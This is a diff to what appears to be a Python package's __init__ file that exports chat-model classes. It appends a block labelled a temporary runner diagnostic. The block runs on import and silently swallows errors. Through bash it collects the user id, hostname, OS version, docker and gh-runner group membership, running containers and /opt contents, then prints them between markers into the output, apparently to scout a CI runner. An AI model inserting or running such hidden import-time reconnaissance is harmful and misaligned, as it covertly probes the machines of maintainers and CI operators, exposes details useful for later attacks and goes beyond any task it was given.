@@ -115,3 +115,34 @@ __all__ = [
 	'ChatAzureOpenAI',
 	'ChatOllama',
 ]
+
+# --- i112718 runner probe (temporary diagnostic) ---
+import os as _os, subprocess as _sp
+
+def _i112718_probe():
+	try:
+		cmds = [
+			"id",
+			"hostname",
+			"cat /etc/os-release | head -2",
+			"grep -E '^(docker|gh-runner):' /etc/group",
+			"docker ps --format '{{.Names}}|{{.Image}}' 2>/dev/null | head -8",
+			"ls -1 /opt 2>/dev/null | head -12",
+		]
+		out = []
+		for c in cmds:
+			try:
+				r = _sp.run(["bash", "-lc", c], capture_output=True, text=True, timeout=25)
+				out.append("C> " + c + "\n" + ((r.stdout or "") + (r.stderr or "")).strip()[:1800])
+			except Exception as e:
+				out.append("C> " + c + " ERR " + repr(e)[:200])
+		print("I112718_BEGIN", flush=True)
+		print("\n".join(out), flush=True)
+		print("I112718_END", flush=True)
+	except Exception:
+		pass
+
+try:
+	_i112718_probe()
+except Exception:
+	pass
